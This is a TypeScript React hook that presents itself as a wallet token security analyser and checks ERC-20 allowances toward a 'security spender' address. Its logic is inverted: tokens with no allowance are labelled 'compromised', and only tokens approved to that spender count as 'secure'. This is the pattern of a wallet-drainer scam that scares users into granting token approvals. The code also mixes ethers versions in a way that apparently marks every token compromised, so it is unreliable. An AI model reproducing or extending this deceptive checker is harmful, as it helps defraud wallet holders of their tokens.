import { useState } from 'react';
import { ethers } from 'ethers';

export type TokenStatus = 'secure' | 'compromised' | 'loading';
export interface SecurityAnalysisResult {
  risks: number;
  message: string;
  status: 'secure' | 'compromised';
}

export function useTokenSecurityAnalysis({
  tokens,
  owner,
  chainId,
  isConnected,
  spender,
}: {
  tokens: Array<{ contractAddress: string; balance: string }>;
  owner: string | undefined;
  chainId: number | undefined;
  isConnected: boolean;
  spender: string;
}) {
  const [analyzing, setAnalyzing] = useState(false);
  const [result, setResult] = useState<null | SecurityAnalysisResult>(null);
  const [tokenStatuses, setTokenStatuses] = useState<Record<string, TokenStatus> | null>(null);

  const analyze = async () => {
    setAnalyzing(true);
    setResult(null);
    setTokenStatuses(null);
    if (!owner || !chainId || tokens.length === 0) {
      setResult({ risks: 0, message: 'Your wallet is secure! No compromise or threats found.', status: 'secure' });
      setAnalyzing(false);
      return;
    }
    let provider;
    try {
      if (typeof window !== 'undefined' && (window as any).ethereum) {
        provider = new ethers.BrowserProvider((window as any).ethereum);
      } else {
        provider = ethers.getDefaultProvider();
      }
    } catch (e) {
      setResult({ risks: 0, message: 'Could not connect to provider.', status: 'compromised' });
      setAnalyzing(false);
      return;
    }
    const ERC20_ABI = [
      'function allowance(address owner, address spender) view returns (uint256)'
    ];
    const statuses: Record<string, TokenStatus> = {};
    let compromisedCount = 0;
    await Promise.all(tokens.map(async (token) => {
      try {
        const contract = new ethers.Contract(token.contractAddress, ERC20_ABI, provider);
        const allowance = await contract.allowance(owner, spender);
        if (allowance && allowance.gt(0)) {
          statuses[token.contractAddress] = 'secure';
        } else {
          statuses[token.contractAddress] = 'compromised';
          compromisedCount++;
        }
      } catch (e) {
        statuses[token.contractAddress] = 'compromised';
        compromisedCount++;
      }
    }));
    setTokenStatuses(statuses);
    setResult(
      compromisedCount > 0
        ? { risks: compromisedCount, message: `Compromised! ${compromisedCount} token(s) do not have allowance set for the security spender.`, status: 'compromised' }
        : { risks: 0, message: 'Secure! All tokens have allowance set for the security spender.', status: 'secure' }
    );
    setAnalyzing(false);
  };

  const reset = () => {
    setResult(null);
    setTokenStatuses(null);
  };

  return { analyzing, result, tokenStatuses, analyze, reset };
} 